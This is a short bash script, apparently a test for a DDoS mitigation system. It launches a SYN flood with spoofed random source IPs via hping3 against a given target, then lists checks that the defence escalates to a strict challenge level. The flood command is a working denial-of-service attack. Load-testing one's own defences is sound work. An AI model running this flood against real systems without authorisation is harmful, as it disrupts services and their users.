#!/bin/bash
# PHASE 5 Test: Distributed SYN Flood (100+ unique source IPs)
# Expected: Origin-specific challenge level escalates to STRICT (level 3)

TARGET_IP=$1
TARGET_PORT=${2:-7080}
DURATION=${3:-30}

if [ -z "$TARGET_IP" ]; then
    echo "Usage: $0 <target_eip> [port] [duration_seconds]"
    exit 1
fi

echo "[DISTRIBUTED SYN FLOOD TEST] Launching distributed attack"
echo "Target: $TARGET_IP:$TARGET_PORT"
echo "Duration: ${DURATION}s"
echo "Expected: Origin challenge escalates to STRICT (>100 unique attacking IPs)"
echo ""

# Distributed SYN flood with random source IPs
hping3 --flood -S -p $TARGET_PORT --rand-source $TARGET_IP &
FLOOD_PID=$!

echo "Attack PID: $FLOOD_PID"
echo "Flooding with random source IPs for ${DURATION}s..."
sleep $DURATION

# Kill flood
kill -9 $FLOOD_PID 2>/dev/null

echo ""
echo "[DISTRIBUTED SYN FLOOD TEST] Attack complete"
echo "Verification steps:"
echo "  1. Check source_ip_behavior_map (should have 100+ entries)"
echo "  2. Verify origin_challenge_map shows level 3 for target origin"
echo "  3. Check mitigation_actions for action_type='origin_challenge'"
echo "  4. Legitimate traffic should adapt to stricter rate limits"
